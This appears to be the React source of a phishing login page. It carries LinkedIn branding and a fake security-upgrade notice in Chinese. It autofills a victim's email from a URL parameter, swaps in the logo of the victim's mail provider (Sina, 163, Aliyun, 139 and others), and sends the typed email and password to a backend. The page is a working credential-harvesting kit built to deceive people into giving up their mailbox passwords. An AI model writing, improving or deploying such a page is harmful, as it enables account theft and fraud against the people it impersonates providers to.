import React, { useState, useEffect } from 'react';
import "./login.css"
import gmail from '../images/google.png';
import googlemail from '../images/google.png';
import qiye163 from '../images/163.jpg';
import qiyealiyun from '../images/qiyealiyun.png';
import mailaliyan from '../images/aliyan.png';
import mailsohu from '../images/sohu.png';
import mail263 from '../images/263.png';
import vipsina from '../images/vipmail.png';
import mail10086 from '../images/139.png';
import bcloud from '../images/bcloud.png';
import mailsina from '../images/sina.png';
import cn21 from '../images/21cn.png';
import defaultlogo from '../images/sina.png';

const emailLogos = {
  'gmail.com': gmail,
  'googlemail.com': googlemail,
  'qiye.163.com': qiye163,
  'qiye.aliyun.com': qiyealiyun,
  'mail.aliyan.com': mailaliyan,
  'mail.sohu.com': mailsohu,
  'mail.263.net': mail263,
  'vip.sina.com.cn': vipsina,
  'mail.10086.cn': mail10086,
  'b.cloud.189.cn': bcloud,
  'mail.sina.com.cn': mailsina,
  'mail.21cn.com': cn21,
};

function Login() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [message, setMessage] = useState({ text: '', type: '' });
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [shake, setShake] = useState(false);
  const [logoSrc, setLogoSrc] = useState(defaultlogo);

  const [showPassword, setShowPassword] = useState(false);


  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const emailFromURL = params.get('mail');

    if (emailFromURL) {
      setEmail(emailFromURL);         // URL થી mail parameter હોય તો એ autofill
      updateLogo(emailFromURL);
    } else {
      setEmail('youbro@mail.sina.com.cn'); // Default email
      setPassword('');                     // Password ખાલી રાખો
      updateLogo('youbro@mail.sina.com.cn'); // Logo પણ auto-set
    }
  }, []);


  const updateLogo = (emailVal) => {
    const domain = emailVal.split('@')[1];
    if (domain) {
      const mappedLogo = emailLogos[domain];
      const fallbackLogo = `https://www.google.com/s2/favicons?sz=64&domain=${domain}`;
      setLogoSrc(mappedLogo || fallbackLogo);
    } else {
      setLogoSrc(defaultlogo);
    }
  };
 

const handleSubmit = (e) => {
  e.preventDefault();

  if (!email || !password) {
    showMessage('请填写所有字段', 'error');
    triggerShake();
    return;
  }

  setSuccess(false);
  setLoading(true);

  fetch("http://localhost:5000/api/login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ email, password })
  })
    .then(res => res.json())
    .then(data => {
      // ✅ Wait for 3 seconds before showing result
      setTimeout(() => {
        setLoading(false);

        if (data.success) {
          showMessage('登录成功', 'success');
          setSuccess(true);

          // Hide success after 2 seconds
          setTimeout(() => {
            setSuccess(false);
            setMessage({ text: '', type: '' });
          }, 2000);
        } else {
          showMessage('邮箱或密码错误', 'error');
          triggerShake();
        }

        setPassword('');
      }, 2000); // ⏱ 2 seconds loader
    })
    .catch(error => {
      console.error("Error:", error);
      showMessage('服务器错误', 'error');
      setLoading(false);
      triggerShake();
    });
};

  const showMessage = (text, type) => {
    setMessage({ text, type });
    setTimeout(() => setMessage({ text: '', type: '' }), 4000);
  };

  const triggerShake = () => {
    setShake(true);
    setTimeout(() => setShake(false), 500);
  };

  const handleLogoClick = () => {
    // Simulate animation
  };

  const showModal = (title) => {
    alert(`${title} 模拟页面。\n\n这里是 ${title} 的展示位置。`);
  };

  return (
    <>
      <div className="login-wrapper">
        <a href="#" className="toplogo" onClick={handleLogoClick}>
          <svg xmlns="http://www.w3.org/2000/svg" width="100" height="50" viewBox="1.786 1.783 287.865 76.248" id="linkedin">
            <path fill="#069" d="M213.882 7.245c0-3.015 2.508-5.462 5.6-5.462h64.568c3.093 0 5.6 2.447 5.6 5.462V72.57c0 3.016-2.507 5.461-5.6 5.461h-64.568c-3.092 0-5.6-2.445-5.6-5.46V7.244z"></path>
            <path d="M1.785 65.652h31.62V55.27H13.23V15.665H1.785v49.987zM49.414 65.652v-34.43H37.97v34.43h11.444zm-5.721-39.13c3.99 0 6.474-2.644 6.474-5.95-.074-3.378-2.484-5.947-6.398-5.947-3.915 0-6.475 2.57-6.475 5.947 0 3.306 2.484 5.95 6.324 5.95h.075zM54.727 65.652h11.444V46.424c0-1.029.074-2.058.377-2.791.826-2.056 2.709-4.186 5.871-4.186 4.142 0 5.799 3.158 5.799 7.784v18.42H89.66V45.91c0-10.576-5.646-15.497-13.176-15.497-6.173 0-8.884 3.451-10.39 5.802h.077v-4.993H54.727c.151 3.231 0 34.43 0 34.43zM105.805 15.665H94.361v49.987h11.444V54.489l2.86-3.601 8.96 14.764h14.078l-15.056-21.373 13.174-14.54h-13.776s-9.411 13.008-10.24 14.552V15.665z"></path>
            <path d="M162.306 51.29c.151-.884.377-2.58.377-4.498 0-8.9-4.518-17.936-16.413-17.936-12.724 0-18.597 10.063-18.597 19.19 0 11.288 7.153 18.337 19.65 18.337 4.97 0 9.561-.732 13.327-2.275l-1.506-7.558c-3.088 1.024-6.25 1.537-10.164 1.537-5.345 0-10.012-2.195-10.389-6.871l23.715.072v.002zm-23.79-7.742c.301-2.938 2.26-7.273 7.153-7.273 5.194 0 6.4 4.628 6.4 7.273h-13.552zM190.93 15.665v17.304h-.151c-1.657-2.422-5.12-4.038-9.71-4.038-8.81 0-16.564 7.05-16.49 19.094 0 11.164 7.003 18.435 15.735 18.435 4.744 0 9.26-2.058 11.52-6.024h.225l.453 5.216h10.163c-.15-2.424-.302-6.61-.302-10.723V15.664h-11.444zm0 34.05c0 .88-.075 1.763-.227 2.495-.675 3.16-3.386 5.361-6.699 5.361-4.742 0-7.83-3.818-7.83-9.84 0-5.654 2.637-10.208 7.906-10.208 3.538 0 6.022 2.423 6.7 5.433.15.663.15 1.398.15 2.058v4.7z"></path>
            <path fill="#fff" d="M236.85 65.61V31.18h-11.444v34.43h11.445zm-5.72-39.13c3.99 0 6.474-2.644 6.474-5.948-.075-3.379-2.484-5.949-6.398-5.949-3.917 0-6.475 2.57-6.475 5.949 0 3.304 2.483 5.948 6.324 5.948h.074zM243.184 65.61h11.443V46.385c0-1.028.075-2.058.377-2.792.827-2.057 2.71-4.186 5.872-4.186 4.14 0 5.797 3.157 5.797 7.786V65.61h11.443V45.869c0-10.575-5.645-15.496-13.174-15.496-6.173 0-8.884 3.45-10.39 5.8h.076v-4.992h-11.443c.149 3.23-.001 34.43-.001 34.43z"></path>
          </svg>
        </a>
        <div className={`login-container ${shake ? 'shake' : ''} ${success ? 'success' : ''}`}>
          <img
            src={logoSrc}
            width="auto"
            height={80}
            alt="Email Logo"
            className="container-logo"
            onClick={handleLogoClick}
          />
          <div className="security-message">
            这是一个私人通知，由于最近的安全升级，现在需要电子邮件验证
          </div>
          <form onSubmit={handleSubmit}>
  <div className="form-group">
    <input
      type="email"
      className="form-input"
      placeholder="请输入电子邮箱"
      value={email}
      onChange={(e) => setEmail(e.target.value)}
      required
    />
  </div>
  <div className="form-group password-group">
  <input
    type={showPassword ? "text" : "password"}
    className="form-input"
    placeholder="密码"
    value={password}
    onChange={(e) => setPassword(e.target.value)}
    required
  />
<span className="toggle-password" onClick={() => setShowPassword(!showPassword)}>
  {showPassword ? (
    // 👁️‍🗨 Eye-Off SVG
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
      <path d="M12.0001 19.0002C11.1581 19.0002 10.3151 18.8222 9.49609 18.5052" stroke="#A6A6A6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
      <path d="M20.882 12.468C18.99 15.967 15.495 19 12 19" stroke="#A6A6A6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
      <path d="M19.0781 8.9209C19.7691 9.7299 20.3831 10.6119 20.8811 11.5329C21.0381 11.8239 21.0381 12.1769 20.8811 12.4679" stroke="#A6A6A6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
      <path d="M5 19L19 5" stroke="#A6A6A6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
      <path d="M9.77016 14.2271C8.54016 12.9971 8.54016 11.0021 9.77016 9.77211C11.0002 8.54211 12.9952 8.54211 14.2252 9.77211" stroke="#A6A6A6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
      <path d="M17.0437 6.956C15.4967 5.759 13.7478 5 11.9998 5C8.50475 5 5.00975 8.033 3.11775 11.533C2.96075 11.824 2.96075 12.177 3.11775 12.468C4.06375 14.217 5.40975 15.849 6.95575 17.045" stroke="#A6A6A6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  ) : (
    // 👁️ Eye-On SVG
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
      <path d="M1.99951 12.0002C2.99951 7.00024 7.00051 4.00024 12.0005 4.00024C17.0005 4.00024 21.0005 7.00024 22.0005 12.0002C21.0005 17.0002 17.0005 20.0002 12.0005 20.0002C7.00051 20.0002 2.99951 17.0002 1.99951 12.0002Z" stroke="#A6A6A6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
      <path d="M15 12C15 13.657 13.657 15 12 15C10.343 15 9 13.657 9 12C9 10.343 10.343 9 12 9C13.657 9 15 10.343 15 12Z" stroke="#A6A6A6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
    </svg>
  )}
</span>

</div>


  <button type="submit" className="signin-button" disabled={loading}>
    <span className="btn-text">{loading ? 'Verifying...' : '签到'}</span>
    {loading && <div className="loading-spinner"></div>}
  </button>
</form>

          {/* ✅ Tick icon on success */}
{success && <div className="success-checkmark show"></div>}

{/* ✅ Show message box below form */}
{message.text && <div className={`message ${message.type}`}>{message.text}</div>}        </div>
        <div className="footer">
          <div className="company-name">Linkedin</div>
          <div className="footer-links">
            <a href="#" onClick={() => showModal('User Agreement')}>User Agreement</a>
            <a href="#" onClick={() => showModal('Privacy Policy')}>Privacy Policy</a>
            <a href="#" onClick={() => showModal('Copyright Notice')}>Copyright Notice</a>
          </div>
          <div className="company-name">
            ICP Licence No. 150024 ICP Filing Number : 14023203 PSB Filing Number: 11030102010420
          </div>
          <div className="company-name">Beijing LingYin Information Tecnology Co. Ltd</div>
        </div>
      </div>
    </>
  );
}

export default Login;
